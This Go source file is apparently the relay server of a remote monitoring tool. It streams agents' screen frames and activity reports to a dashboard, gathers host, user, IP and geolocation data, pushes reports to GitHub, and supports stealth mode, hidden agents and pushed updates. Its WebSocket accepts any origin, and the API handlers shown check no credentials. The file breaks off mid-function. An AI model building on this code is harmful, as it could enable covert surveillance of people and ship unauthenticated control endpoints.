package main

import (
	"bufio"
	"bytes"
	"context"
	"embed"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

type Config struct {
	mu                 sync.Mutex
	ConfigPort         int
	QuicPort           int // separate port for QUIC server
	MonthlyLimitMB     int64
	MaxAgentBandwidthMB int // per-agent bandwidth limit (MB/s), 0 = unlimited
	TunnelMode         string
	ServerURLs         []string
	IsServerMode       bool
	IsLanMode          bool
	Autostart          bool
	StealthMode        bool
	GitHubRepo         string
	GitHubToken        string
	MaxFPS             float64
	AuthUser           string
	AuthPass           string
	DNSDomain          string
}

func (c *Config) GetServerURLs() []string {
	if c == nil { return []string{} }
	return c.ServerURLs
}
func (c *Config) SetServerURLs(urls []string) { if c != nil { c.ServerURLs = urls } }
func (c *Config) SetMonthlyLimitMB(v int64) { if c != nil { c.MonthlyLimitMB = v } }

type CaptureTier int
const (
	CaptureTierAuto CaptureTier = iota
	CaptureTierLow
	CaptureTierHigh
)

type BandwidthMonitor struct {
	mu             sync.Mutex
	LimitMB        int64
	UsedBytes      int64
	CurrentRateBps float64
	StartTime      time.Time
	windowBytes    int64
	windowStart    time.Time
	throttleDelay  time.Duration
}

func NewBandwidthMonitor(limitMB int64) *BandwidthMonitor {
	return &BandwidthMonitor{
		LimitMB:     limitMB,
		StartTime:   time.Now(),
		windowStart: time.Now(),
	}
}

func (bm *BandwidthMonitor) SetLimitMB(limitMB int64) {
	if bm == nil {
		return
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	bm.LimitMB = limitMB
}

func (bm *BandwidthMonitor) RecordBytes(n int) {
	if bm == nil {
		return
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	bm.UsedBytes += int64(n)
	bm.windowBytes += int64(n)
	
	now := time.Now()
	if now.Sub(bm.windowStart) >= 1*time.Second {
		bm.CurrentRateBps = float64(bm.windowBytes) / now.Sub(bm.windowStart).Seconds()
		bm.windowBytes = 0
		bm.windowStart = now
	}
	
	if bm.LimitMB > 0 {
		limitBytes := bm.LimitMB * 1024 * 1024
		if bm.UsedBytes >= limitBytes {
			bm.throttleDelay = 100 * time.Millisecond
		} else if bm.UsedBytes >= limitBytes*9/10 {
			bm.throttleDelay = 50 * time.Millisecond
		} else if bm.CurrentRateBps > 5*1024*1024 {
			bm.throttleDelay = 20 * time.Millisecond
		} else {
			bm.throttleDelay = 0
		}
	}
}

func (bm *BandwidthMonitor) GetThrottleDelay() time.Duration {
	if bm == nil {
		return 0
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	return bm.throttleDelay
}

func (bm *BandwidthMonitor) GetUsedMB() float64 {
	if bm == nil {
		return 0
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	return float64(bm.UsedBytes) / (1024 * 1024)
}

func (bm *BandwidthMonitor) GetCurrentRateKBps() float64 {
	if bm == nil {
		return 0
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	return bm.CurrentRateBps / 1024
}

func (bm *BandwidthMonitor) GetLimitMB() int64 {
	if bm == nil {
		return 0
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	return bm.LimitMB
}

func (bm *BandwidthMonitor) IsOverLimit() bool {
	if bm == nil {
		return false
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if bm.LimitMB <= 0 {
		return false
	}
	return bm.UsedBytes >= bm.LimitMB*1024*1024
}

func (bm *BandwidthMonitor) Reset() {
	if bm == nil {
		return
	}
	bm.mu.Lock()
	defer bm.mu.Unlock()
	bm.UsedBytes = 0
	bm.windowBytes = 0
	bm.CurrentRateBps = 0
	bm.throttleDelay = 0
	bm.StartTime = time.Now()
	bm.windowStart = time.Now()
}

type WireMessage struct {
	Type int
	Data []byte
}
func (wm *WireMessage) Marshal() []byte {
	data, _ := json.Marshal(wm)
	return data
}
func (wm *WireMessage) Unmarshal(data []byte) error { return json.Unmarshal(data, wm) }

type InputEvent struct {
	MouseMove       func(int, int)
	MouseClick      func(int, int, bool)
	MouseMiddleClick func(int, int)
	KeyPress        func(uint16)
	TypeText        func(string)
}

type TunnelManager struct{}
func NewTunnelManager(mode string, port int) *TunnelManager { return &TunnelManager{} }
func (tm *TunnelManager) Start(ctx context.Context) error   { return nil }
func (tm *TunnelManager) Stop()                             {}

const (
	MSG_HEARTBEAT = 1
	MSG_REPORT = 2
	MSG_FRAME_DELTA = 3
	MSG_FRAME_KEY = 4
	MSG_CONTROL = 5
	MSG_UPDATE_URLS = 6
	// WebRTC signaling
	MSG_WEBRTC_OFFER = 7
	MSG_WEBRTC_ANSWER = 8
	MSG_WEBRTC_ICE = 9
	MIN_FPS = 1.0
	CONNECTION_TIMEOUT = 30 * time.Second
	HEARTBEAT_INTERVAL = 5 * time.Second
	LAN_SCAN_WORKERS = 10
	LAN_SCAN_TIMEOUT = 5 * time.Second
	defaultAgentPort = 8181
)

type Transport interface {
	Send(*WireMessage) error
	Recv() (*WireMessage, error)
	Name() string
}

type DashboardServer struct {
	cfg         *Config
	startTime   time.Time
	reportsMu   sync.Mutex
	reports     map[string][]ActivityEvent
	frameCh     chan *WireMessage
	agent       *Agent
	pool        *TransportPool
	bandwidth   *BandwidthMonitor
	addReport   func(string, []ActivityEvent)
	dashConns   map[*websocket.Conn]bool
	dashMu      sync.Mutex
	upgrader    websocket.Upgrader
}

func downloadFile(url, dest string) error {
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	f, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(f, resp.Body)
	return err
}

//go:embed dashboard.html
var embeddedFS embed.FS

// ============================================================================
// Utility: System Information
// ============================================================================

func (ds *DashboardServer) getSystemInfo() map[string]string {
	info := make(map[string]string)

	// Hostname
	if hostname, err := os.Hostname(); err == nil {
		info["hostname"] = hostname
	}
	
	// Username
	if user, err := user.Current(); err == nil {
		info["username"] = user.Username
	}
	
	// Local IP - prefer Ethernet/WiFi over virtual adapters
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			ifaceAddrs, _ := iface.Addrs()
			for _, addr := range ifaceAddrs {
				if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
					ip := ipnet.IP.String()
					if !strings.HasPrefix(ip, "169.254.") {
						info["local_ip"] = ip
						break
					}
				}
			}
			if info["local_ip"] != "" {
				break
			}
		}
	}
	
	// WAN IP detection
	wanIP := detectWANIP()
	if wanIP != "" {
		info["wan_ip"] = wanIP
	} else {
		info["wan_ip"] = "Not available"
	}
	
	// Geo location
	geoInfo := detectGeoLocation()
	if geoInfo != "" {
		info["geo"] = geoInfo
	} else {
		info["geo"] = "Not available"
	}
	
	// Uptime (approximate from process start time)
	if uptimeSec := int(time.Since(ds.startTime).Seconds()); uptimeSec >= 0 {
		hours := uptimeSec / 3600
		minutes := (uptimeSec % 3600) / 60
		seconds := uptimeSec % 60
		info["uptime"] = fmt.Sprintf("%02d:%02d:%02d", hours, minutes, seconds)
	}
	
	updateSystemInfoFromActivity(info)
	return info
}

func detectWANIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	services := []string{
		"https://api.ipify.org",
		"https://ifconfig.me/ip",
		"https://icanhazip.com",
	}
	for _, url := range services {
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			data, err := io.ReadAll(resp.Body)
			if err == nil {
				ip := strings.TrimSpace(string(data))
				if net.ParseIP(ip) != nil && ip != "" {
					return ip
				}
			}
		}
	}
	return ""
}

func detectGeoLocation() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return ""
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	var result struct {
		Status  string  `json:"status"`
		City    string  `json:"city"`
		Region  string  `json:"regionName"`
		Country string  `json:"country"`
		Lat     float64 `json:"lat"`
		Lon     float64 `json:"lon"`
		ISP     string  `json:"isp"`
	}
	if err := json.Unmarshal(data, &result); err != nil {
		return ""
	}
	if result.Status == "success" {
		return fmt.Sprintf("%s, %s, %s (%.4f, %.4f) - %s", result.City, result.Region, result.Country, result.Lat, result.Lon, result.ISP)
	}
	return ""
}

// ============================================================================
// SECTION 12 — API HANDLERS
// ============================================================================

func (ds *DashboardServer) apiReportHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		if r.URL.Query().Get("events") == "1" {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(mergeActivityEvents(ds.reports))
			return
		}
		ds.reportsMu.Lock()
		var agents []string
		for id := range ds.reports {
			agents = append(agents, id)
		}
		ds.reportsMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(agents)
		return
	}
	ds.reportsMu.Lock()
	events := ds.reports[agentID]
	ds.reportsMu.Unlock()
	if events == nil {
		events = []ActivityEvent{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(events)
}

func mergeActivityEvents(reports map[string][]ActivityEvent) []ActivityEvent {
	return mergeActivityEventsWithAgent(reports)
}

func (ds *DashboardServer) apiReportCSVHandler(w http.ResponseWriter, r *http.Request) {
	ds.reportsMu.Lock()
	events := make(map[string][]ActivityEvent)
	for id, evs := range ds.reports {
		cpy := make([]ActivityEvent, len(evs))
		copy(cpy, evs)
		events[id] = cpy
	}
	ds.reportsMu.Unlock()
	writeActivityCSV(w, events, "activity-report-"+time.Now().Format("2006-01-02")+".csv")
}

func (ds *DashboardServer) apiPushReportHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	repo := ds.cfg.GitHubRepo
	token := ds.cfg.GitHubToken
	if repo == "" || token == "" {
		http.Error(w, "GitHub repo/token not configured", http.StatusBadRequest)
		return
	}
	ds.reportsMu.Lock()
	events := make(map[string][]ActivityEvent)
	for id, evs := range ds.reports {
		evsCopy := make([]ActivityEvent, len(evs))
		copy(evsCopy, evs)
		events[id] = evsCopy
	}
	ds.reportsMu.Unlock()
	if len(events) == 0 {
		w.Write([]byte("no events to push"))
		return
	}

	dateStr := time.Now().Format("2006-01-02")
	var buf bytes.Buffer
	buf.WriteString("agent_id,timestamp,type,detail\n")
	for id, evs := range events {
		for _, e := range evs {
			ts := time.UnixMilli(e.Timestamp).Format(time.RFC3339)
			detail := strings.ReplaceAll(e.Detail, `"`, `""`)
			buf.WriteString(fmt.Sprintf(`%s,%s,%s,"%s"`+"\n", id, ts, e.Type, detail))
		}
	}
	path := fmt.Sprintf("reports/%s/activity.csv", dateStr)
	body := map[string]interface{}{
		"message": fmt.Sprintf("Daily report %s", dateStr),
		"content": base64.StdEncoding.EncodeToString(buf.Bytes()),
	}
	payload, _ := json.Marshal(body)
	url := fmt.Sprintf("https://api.github.com/repos/%s/contents/%s", repo, path)
	req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	resp.Body.Close()
	if resp.StatusCode == 201 || resp.StatusCode == 200 {
		w.Write([]byte("pushed"))
	} else {
		http.Error(w, fmt.Sprintf("github push status %d", resp.StatusCode), http.StatusInternalServerError)
	}
}

func (ds *DashboardServer) apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		json.NewEncoder(w).Encode(map[string]interface{}{
			"github_repo": ds.cfg.GitHubRepo,
			"dns_domain":  ds.cfg.DNSDomain,
		})
	case "POST":
		var body struct {
			GitHubRepo  string `json:"github_repo"`
			GitHubToken string `json:"github_token"`
			DNSDomain   string `json:"dns_domain"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		if body.GitHubRepo != "" {
			ds.cfg.GitHubRepo = body.GitHubRepo
		}
		if body.GitHubToken != "" {
			ds.cfg.GitHubToken = body.GitHubToken
		}
		if body.DNSDomain != "" {
			ds.cfg.DNSDomain = body.DNSDomain
		}
		// Persist to config.json
		saveConfig(ds.cfg)
		w.WriteHeader(http.StatusOK)
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ============================================================================
// Utility: sendJSON (write JSON to WebSocket connection)
// ============================================================================

func sendJSON(conn *websocket.Conn, v interface{}) {
	data, err := json.Marshal(v)
	if err == nil {
		conn.WriteMessage(websocket.TextMessage, data)
	}
}



// ============================================================================
// SECTION 18 — ServerMode (central relay: agents → dashboards)
// ============================================================================

type AgentInfo struct {
	transport    Transport
	version      string
	connectedAt  time.Time
	lastSeen     time.Time
	sendMu       sync.Mutex
}

func (ai *AgentInfo) Send(wm *WireMessage) error {
	ai.sendMu.Lock()
	defer ai.sendMu.Unlock()
	if ai.transport == nil {
		return fmt.Errorf("agent transport nil")
	}
	return ai.transport.Send(wm)
}

type ServerMode struct {
	cfg            *Config
	agents         map[string]*AgentInfo
	agentsMu       sync.Mutex
	dashConns      map[*websocket.Conn]bool
	dashMu         sync.Mutex
	upgrader       websocket.Upgrader
	reports        map[string][]ActivityEvent
	reportsMu      sync.Mutex
	hiddenAgents   map[string]bool
	hiddenMu       sync.Mutex
	pendingUpdates map[string]string
	pendingUpdMu   sync.Mutex
	webrtcHandler  *WebRTCSignalHandler
	webrtcMu       sync.RWMutex
	quicServer     *QUICTunnelServer
	ctx            context.Context
	quit           chan struct{}
}

func NewServerMode(cfg *Config) *ServerMode {
	sm := &ServerMode{
		cfg:            cfg,
		agents:         make(map[string]*AgentInfo),
		dashConns:      make(map[*websocket.Conn]bool),
		reports:        make(map[string][]ActivityEvent),
		hiddenAgents:   make(map[string]bool),
		pendingUpdates: make(map[string]string),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
	}
	sm.webrtcHandler = NewWebRTCSignalHandler(sm.handleWebRTCData)
	go sm.reportCleanLoop()
	go sm.githubPushLoop()
	return sm
}

// ── GitHub auto-push (daily report to repository) ──

func (sm *ServerMode) githubPushLoop() {
	for {
		now := time.Now()
		next := time.Date(now.Year(), now.Month(), now.Day(), 23, 0, 0, 0, now.Location())
		if !next.After(now) {
			next = next.Add(24 * time.Hour)
		}
		time.Sleep(time.Until(next))
		sm.pushReportsToGitHub()
	}
}

func (sm *ServerMode) pushReportsToGitHub() {
	repo := sm.cfg.GitHubRepo
	token := sm.cfg.GitHubToken
	if repo == "" || token == "" {
		return
	}
	sm.reportsMu.Lock()
	events := make(map[string][]ActivityEvent)
	for id, evs := range sm.reports {
		evsCopy := make([]ActivityEvent, len(evs))
		copy(evsCopy, evs)
		events[id] = evsCopy
	}
	sm.reportsMu.Unlock()
	if len(events) == 0 {
		return
	}

	dateStr := time.Now().Format("2006-01-02")
	var buf bytes.Buffer
	buf.WriteString("agent_id,timestamp,type,detail\n")
	for id, evs := range events {
		for _, e := range evs {
			ts := time.UnixMilli(e.Timestamp).Format(time.RFC3339)
			detail := strings.ReplaceAll(e.Detail, `"`, `""`)
			buf.WriteString(fmt.Sprintf(`%s,%s,%s,"%s"`+"\n", id, ts, e.Type, detail))
		}
	}

	path := fmt.Sprintf("reports/%s/activity.csv", dateStr)
	body := map[string]interface{}{
		"message": fmt.Sprintf("Daily report %s", dateStr),
		"content": base64.StdEncoding.EncodeToString(buf.Bytes()),
	}
	payload, _ := json.Marshal(body)

	url := fmt.Sprintf("https://api.github.com/repos/%s/contents/%s", repo, path)
	req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
	if err != nil {
		llog("error", "github push: %v", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		llog("error", "github push: %v", err)
		return
	}
	resp.Body.Close()
	if resp.StatusCode == 201 || resp.StatusCode == 200 {
		llog("info", "github report pushed: %s", path)
	} else {
		llog("warn", "github push status %d for %s", resp.StatusCode, path)
	}
}

func (sm *ServerMode) reportCleanLoop() {
	for {
		time.Sleep(10 * time.Minute)
		cutoff := time.Now().Add(-24 * time.Hour).UnixMilli()
		sm.reportsMu.Lock()
		for id, events := range sm.reports {
			var kept []ActivityEvent
			for _, e := range events {
				if e.Timestamp >= cutoff {
					kept = append(kept, e)
				}
			}
			if len(kept) == 0 {
				delete(sm.reports, id)
			} else {
				sm.reports[id] = kept
			}
		}
		sm.reportsMu.Unlock()
	}
}

func (sm *ServerMode) addReport(agentID string, events []ActivityEvent) {
	sm.reportsMu.Lock()
	defer sm.reportsMu.Unlock()
	sm.reports[agentID] = append(sm.reports[agentID], events...)
	go saveDailyReportSnapshot(sm.reports)
	// Trim to last 24h
	cutoff := time.Now().Add(-24 * time.Hour).UnixMilli()
	var kept []ActivityEvent
	for _, e := range sm.reports[agentID] {
		if e.Timestamp >= cutoff {
			kept = append(kept, e)
		}
	}
	sm.reports[agentID] = kept
}

func (sm *ServerMode) Start(ctx context.Context) error {
	// Start QUIC server if configured
	if sm.cfg.QuicPort > 0 {
		addr := fmt.Sprintf(":%d", sm.cfg.QuicPort)
		var err error
		sm.quicServer, err = NewQUICTunnelServer(addr, sm.handleQUICConnection)
		if err != nil {
			llog("warn", "QUIC server failed to start on %s: %v", addr, err)
		} else {
			sm.quicServer.Start(ctx)
			llog("info", "QUIC server listening on %s", addr)
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", sm.relayDashboard)
	mux.HandleFunc("/agent/ws", sm.agentWS)
	mux.HandleFunc("/ws", sm.dashboardWS)
	mux.HandleFunc("/dashboard/ws", sm.dashboardWS)
	mux.HandleFunc("/api/agents", sm.agentListHandler)
	mux.HandleFunc("/api/update", sm.apiUpdateHandler)
	mux.HandleFunc("/api/restart", sm.apiRestartHandler)
	mux.HandleFunc("/api/report", sm.apiReportHandler)
	mux.HandleFunc("/api/report.csv", sm.apiReportCSVHandler)
	mux.HandleFunc("/api/settings", sm.apiSettingsHandler)
	mux.HandleFunc("/api/push-report", sm.apiPushReportHandler)
	mux.HandleFunc("/api/metrics", sm.metricsHandler)
	mux.HandleFunc("/api/config", sm.configHandler)
	mux.HandleFunc("/api/config/update", sm.apiConfigUpdateHandler)
	mux.HandleFunc("/api/tier", sm.tierHandler)
	mux.HandleFunc("/api/bandwidth", sm.bandwidthHandler)
	mux.HandleFunc("/api/system-info", sm.apiSystemInfoHandler)
	mux.HandleFunc("/api/compile-monthly-report", sm.apiCompileMonthlyHandler)
	mux.HandleFunc("/api/hide-agent", sm.apiHideAgentHandler)
	mux.HandleFunc("/api/remove-agent", sm.apiRemoveAgentHandler)
	mux.HandleFunc("/api/agents/full", sm.apiAgentListFullHandler)
	mux.HandleFunc("/api/push-update", sm.apiPushUpdateHandler)
	server := &http.Server{
		Addr:    fmt.Sprintf(":%d", sm.cfg.ConfigPort),
		Handler: mux,
	}

	// Graceful shutdown
	go func() {
		<-ctx.Done()
		if sm.quicServer != nil {
			sm.quicServer.Stop()
		}
		sc, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		server.Shutdown(sc)
	}()

	llog("info", "server relay listening on :%d", sm.cfg.ConfigPort)
	return server.ListenAndServe()
}


func (sm *ServerMode) relayDashboard(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	data, err := embeddedFS.ReadFile("dashboard.html")
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	w.Write(data)
}

func (sm *ServerMode) agentWS(w http.ResponseWriter, r *http.Request) {
	conn, err := sm.upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "upgrade failed", http.StatusBadRequest)
		return
	}
	agentID := r.URL.Query().Get("id")
	if agentID == "" {
		agentID = r.Header.Get("X-Agent-ID")
	}
	if agentID == "" {
		agentID = fmt.Sprintf("agent-%d", time.Now().Unix())
	}
	transport := NewWSTransport(conn, 10, r.URL.String())
	info := &AgentInfo{
		transport:   transport,
		connectedAt: time.Now(),
		lastSeen:    time.Now(),
	}
	sm.agentsMu.Lock()
	sm.agents[agentID] = info
	sm.agentsMu.Unlock()

	// Register this WebSocket connection with WebRTC handler for signaling
	sm.webrtcHandler.SetConn(agentID, conn)

	llog("info", "agent connected: %s", agentID)
	sm.broadcastAgentList()
	// Check for pending updates
	go sm.sendPendingUpdates(agentID)
	defer func() {
		sm.agentsMu.Lock()
		delete(sm.agents, agentID)
		sm.agentsMu.Unlock()
		sm.webrtcHandler.RemoveConn(agentID)
		sm.webrtcHandler.Close(agentID)
		conn.Close()
		sm.broadcastAgentList()
	}()
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		wm := &WireMessage{}
		if wm.Unmarshal(msg) != nil {
			continue
		}

		// Handle WebRTC signaling
		if wm.Type == MSG_WEBRTC_OFFER {
			go func() {
				answer, err := sm.webrtcHandler.HandleOffer(agentID, string(wm.Data))
				if err != nil {
					llog("warn", "webrtc handle offer: %v", err)
					return
				}
				resp := &WireMessage{Type: MSG_WEBRTC_ANSWER, Data: []byte(answer)}
				if err := info.Send(resp); err != nil {
					llog("warn", "webrtc send answer: %v", err)
				}
			}()
			continue
		}
		if wm.Type == MSG_WEBRTC_ICE {
			go func() {
				if err := sm.webrtcHandler.HandleICECandidate(agentID, string(wm.Data)); err != nil {
					llog("warn", "webrtec ICE candidate: %v", err)
				}
			}()
			continue
		}

		// Regular messages (report, frame, heartbeat, control)
		if wm.Type == MSG_REPORT {
			var events []ActivityEvent
			if json.Unmarshal(wm.Data, &events) == nil && len(events) > 0 {
				sm.addReport(agentID, events)
				if globalActivity != nil {
					for _, e := range events {
						d := e.Detail
						if d == "" {
							d = agentID
						} else {
							d = d + " (" + agentID + ")"
						}
						globalActivity.Record(e.Type, d)
					}
				}
			}
			continue
		}
		if wm.Type == MSG_FRAME_DELTA || wm.Type == MSG_FRAME_KEY {
			llog("info", "relay frame to dashboard: agent=%s size=%d", agentID, len(wm.Data))
			relay := map[string]interface{}{
				"type":    "frame",
				"agentId": agentID,
				"data":    base64.StdEncoding.EncodeToString(wm.Data),
			}
			data, _ := json.Marshal(relay)
			sm.dashMu.Lock()
			llog("debug", "dashboard clients: %d", len(sm.dashConns))
			for dc := range sm.dashConns {
				if err := dc.WriteMessage(websocket.TextMessage, data); err != nil {
					dc.Close()
					delete(sm.dashConns, dc)
				}
			}
			sm.dashMu.Unlock()
		}
		if wm.Type == MSG_HEARTBEAT {
			var hello struct {
				Type    string `json:"type"`
				Version string `json:"version"`
			}
			if json.Unmarshal(wm.Data, &hello) == nil && hello.Type == "hello" && hello.Version != "" {
				sm.agentsMu.Lock()
				if info, ok := sm.agents[agentID]; ok {
					info.version = hello.Version
					info.lastSeen = time.Now()
				}
				sm.agentsMu.Unlock()
			}
		}
		if wm.Type == MSG_CONTROL {
			var cmd map[string]interface{}
			if json.Unmarshal(wm.Data, &cmd) == nil {
				if cmd["type"] == "get_urls" {
					urls := sm.cfg.GetServerURLs()
					if len(urls) > 0 {
						data, _ := json.Marshal(map[string]interface{}{"type": "urls_updated", "urls": urls})
						respWm := &WireMessage{Type: MSG_UPDATE_URLS, Data: data}
						conn.WriteMessage(websocket.BinaryMessage, respWm.Marshal())
					}
				}
			}
		}
	}
}

func (sm *ServerMode) agentIDList() []string {
	sm.agentsMu.Lock()
	defer sm.agentsMu.Unlock()
	var list []string
	for id := range sm.agents {
		list = append(list, id)
	}
	return list
}

func (sm *ServerMode) visibleAgentList() []string {
	sm.agentsMu.Lock()
	sm.hiddenMu.Lock()
	defer sm.agentsMu.Unlock()
	defer sm.hiddenMu.Unlock()
	var list []string
	for id := range sm.agents {
		if !sm.hiddenAgents[id] {
			list = append(list, id)
		}
	}
	return list
}

func (sm *ServerMode) allAgentListWithStatus() []map[string]interface{} {
	sm.agentsMu.Lock()
	sm.hiddenMu.Lock()
	defer sm.agentsMu.Unlock()
	defer sm.hiddenMu.Unlock()
	var list []map[string]interface{}
	for id, info := range sm.agents {
		list = append(list, map[string]interface{}{
			"id":      id,
			"hidden":  sm.hiddenAgents[id],
			"version": info.version,
		})
	}
	return list
}

func (sm *ServerMode) handleWebRTCData(agentID string, msg *WireMessage) {
	// Handle data received from WebRTC data channel
	// Update lastSeen for any message
	sm.agentsMu.Lock()
	info, ok := sm.agents[agentID]
	if ok {
		info.lastSeen = time.Now()
	}
	sm.agentsMu.Unlock()
	if !ok {
		return
	}

	// Process message types
	switch msg.Type {
	case MSG_REPORT:
		var events []ActivityEvent
		if json.Unmarshal(msg.Data, &events) == nil && len(events) > 0 {
			sm.addReport(agentID, events)
			if globalActivity != nil {
				for _, e := range events {
					d := e.Detail
					if d == "" {
						d = agentID
					} else {
						d = d + " (" + agentID + ")"
					}
					globalActivity.Record(e.Type, d)
				}
			}
		}
	case MSG_FRAME_DELTA, MSG_FRAME_KEY:
		llog("info", "relay frame (WebRTC) to dashboard: agent=%s size=%d", agentID, len(msg.Data))
		relay := map[string]interface{}{
			"type":    "frame",
			"agentId": agentID,
			"data":    base64.StdEncoding.EncodeToString(msg.Data),
		}
		data, _ := json.Marshal(relay)
		sm.dashMu.Lock()
		for dc := range sm.dashConns {
			_ = dc.WriteMessage(websocket.TextMessage, data)
		}
		sm.dashMu.Unlock()
	case MSG_HEARTBEAT:
		var hello struct {
			Type    string `json:"type"`
			Version string `json:"version"`
		}
		if json.Unmarshal(msg.Data, &hello) == nil && hello.Type == "hello" && hello.Version != "" {
			sm.agentsMu.Lock()
			if info, ok := sm.agents[agentID]; ok {
				info.version = hello.Version
			}
			sm.agentsMu.Unlock()
		}
	}
}

func (sm *ServerMode) handleQUICConnection(t Transport, remoteAddr string) {
	agentID := remoteAddr
	sm.agentsMu.Lock()
	if _, exists := sm.agents[agentID]; exists {
		agentID = remoteAddr + "-" + fmt.Sprintf("%d", time.Now().UnixNano())
	}
	info := &AgentInfo{
		transport:   t,
		connectedAt: time.Now(),
		lastSeen:    time.Now(),
	}
	sm.agents[agentID] = info
	sm.agentsMu.Unlock()
	llog("info", "agent connected via QUIC: %s", agentID)
	sm.broadcastAgentList()

	defer func() {
		sm.agentsMu.Lock()
		delete(sm.agents, agentID)
		sm.agentsMu.Unlock()
		sm.broadcastAgentList()
		if qt, ok := t.(*quicTransport); ok {
			qt.Close()
		}
	}()

	for {
		wm, err := t.Recv()
		if err != nil {
			break
		}
		// Update lastSeen
		sm.agentsMu.Lock()
		if info, ok := sm.agents[agentID]; ok {
			info.lastSeen = time.Now()
		}
		sm.agentsMu.Unlock()

		// Process message types (similar to WebSocket)
		switch wm.Type {
		case MSG_REPORT:
			var events []ActivityEvent
			if json.Unmarshal(wm.Data, &events) == nil && len(events) > 0 {
				sm.addReport(agentID, events)
				if globalActivity != nil {
					for _, e := range events {
						d := e.Detail
						if d == "" {
							d = agentID
						} else {
							d = d + " (" + agentID + ")"
						}
						globalActivity.Record(e.Type, d)
					}
				}
			}
		case MSG_FRAME_DELTA, MSG_FRAME_KEY:
			llog("info", "relay frame (QUIC) to dashboard: agent=%s size=%d", agentID, len(wm.Data))
			relay := map[string]interface{}{
				"type":    "frame",
				"agentId": agentID,
				"data":    base64.StdEncoding.EncodeToString(wm.Data),
			}
			data, _ := json.Marshal(relay)
			sm.dashMu.Lock()
			for dc := range sm.dashConns {
				_ = dc.WriteMessage(websocket.TextMessage, data)
			}
			sm.dashMu.Unlock()
		case MSG_HEARTBEAT:
			var hello struct {
				Type    string `json:"type"`
				Version string `json:"version"`
			}
			if json.Unmarshal(wm.Data, &hello) == nil && hello.Type == "hello" && hello.Version != "" {
				sm.agentsMu.Lock()
				if info, ok := sm.agents[agentID]; ok {
					info.version = hello.Version
				}
				sm.agentsMu.Unlock()
			}
		}
	}
}

func (sm *ServerMode) sendToAgent(agentID string, wm *WireMessage) error {
	// Try WebRTC first
	if sm.webrtcHandler != nil {
		if err := sm.webrtcHandler.SendData(agentID, wm.Data); err == nil {
			return nil
		}
	}
	// Fallback to WebSocket
	sm.agentsMu.Lock()
	info, ok := sm.agents[agentID]
	sm.agentsMu.Unlock()
	if !ok {
		return fmt.Errorf("agent not found")
	}
	return info.Send(wm)
}

func (sm *ServerMode) broadcastAgentListTo(conn *websocket.Conn) {
	list := sm.visibleAgentList()
	data, _ := json.Marshal(list)
	_ = conn.WriteMessage(websocket.TextMessage, data)
}

func (sm *ServerMode) broadcastAgentList() {
	list := sm.visibleAgentList()
	data, _ := json.Marshal(list)
	sm.dashMu.Lock()
	for dc := range sm.dashConns {
		if err := dc.WriteMessage(websocket.TextMessage, data); err != nil {
			dc.Close()
			delete(sm.dashConns, dc)
		}
	}
	sm.dashMu.Unlock()
}

func (sm *ServerMode) dashboardWS(w http.ResponseWriter, r *http.Request) {
	conn, err := sm.upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "upgrade failed", http.StatusBadRequest)
		return
	}
	sm.dashMu.Lock()
	sm.dashConns[conn] = true
	sm.dashMu.Unlock()
	sm.broadcastAgentListTo(conn)
	defer func() {
